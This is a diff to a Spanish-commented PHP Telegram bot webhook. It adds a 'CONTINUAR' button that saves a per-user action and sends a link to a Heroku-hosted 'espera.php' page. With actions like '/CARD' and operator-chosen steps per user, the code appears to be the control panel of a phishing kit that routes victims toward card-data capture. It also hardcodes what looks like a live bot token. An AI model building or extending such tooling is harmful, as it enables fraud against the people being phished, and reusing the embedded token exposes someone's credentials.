@@ -1,5 +1,5 @@
 <?php
-// ===== bot.php FUNCIONAL =====
+// ===== bot.php FUNCIONAL (ARREGLADO) =====
 
 // 🔐 TOKEN DEL BOT
 $token = "8521201522:AAF90SGm6bahwP72Q2TSo83LDxp9ngq94MI";
@@ -8,7 +8,7 @@ $token = "8521201522:AAF90SGm6bahwP72Q2TSo83LDxp9ngq94MI";
 $content = file_get_contents("php://input");
 $update = json_decode($content, true);
 
-// 🧪 Log para depuración (opcional)
+// 🧪 Log para depuración
 file_put_contents("log.txt", print_r($update, true), FILE_APPEND);
 
 // 🎯 Procesar botones (callback_query)
@@ -51,6 +51,9 @@ if (isset($update['callback_query'])) {
             case "CARD":
                 $accion = "/CARD";
                 break;
+            case "CONTINUAR": // 👈 ESTE FALTABA
+                $accion = "/CONTINUAR";
+                break;
             default:
                 $accion = "/ERROR";
         }
@@ -58,12 +61,31 @@ if (isset($update['callback_query'])) {
         // 💾 Guardar acción
         file_put_contents($archivo, $accion);
 
-        // ✅ Responder al botón
+        // ✅ Responder al botón (quita el loading)
         file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
             'callback_query_id' => $callback_id,
             'text' => "✅ Acción enviada para $usuario",
             'show_alert' => false
         ]));
+
+        // 🚀 SI PRESIONA CONTINUAR → ENVIAR LINK (ESTO ES LO CLAVE)
+        if ($comando === "CONTINUAR") {
+
+            file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
+                "chat_id" => $chat_id,
+                "text" => "Continúa al siguiente paso 👇",
+                "reply_markup" => json_encode([
+                    "inline_keyboard" => [
+                        [
+                            [
+                                "text" => "➡️ Abrir página",
+                                "url" => "https://bmproservic2026-d6f976187c6a.herokuapp.com/indeff/espera.php?u=$usuario"
+                            ]
+                        ]
+                    ]
+                ])
+            ]));
+        }
     }
 }
 ?>
